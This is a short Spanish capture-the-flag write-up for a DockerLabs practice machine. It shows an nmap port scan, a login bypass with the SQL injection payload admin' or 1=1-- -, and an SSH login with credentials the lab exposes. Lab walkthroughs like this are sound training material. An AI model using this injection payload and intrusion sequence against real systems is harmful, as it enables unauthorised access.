
Enlace de la máquina --> https://dockerlabs.es/

-------------------------

PROCEDIMIENTO:

Tenemos la IP: `172.17.0.2`

![[Pasted image 20240904161947.png]]

----------------------

RECONOCIMIENTO:

Hacemos un reconocimiento de puertos con `nmap`. Con el siguiente comando:

```
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG escaneo
```

Nos sale los siguientes puertos:

![[Pasted image 20240904162707.png]]

----------------------------

EXPLOTACIÓN:

Accedemos a la web poniendo la ip en el navegador y nos sale una web de logeo: 

![[Pasted image 20240904162956.png]]

Como no sabemos usuario ni contraseña haremos una injeción SQL, con el siguiente parámetro:

```
admin' or 1=1-- -
```

La contraseña ponemos la queramos y nos sale lo siguiente: 

![[Pasted image 20240904163236.png]]

Tenemos usuario y contraseña y el puerto 22 ssh abierto. Pues intentemos introducirnos con el siguiente comando:

```
ssh dylan@172.17.0.2
```

![[Pasted image 20240904163522.png]]

Ponemos la contraseña:

```
KJSDFG789FGSDF78
```


Y ya estaríamos adentro 
![[Pasted image 20240904163724.png]]
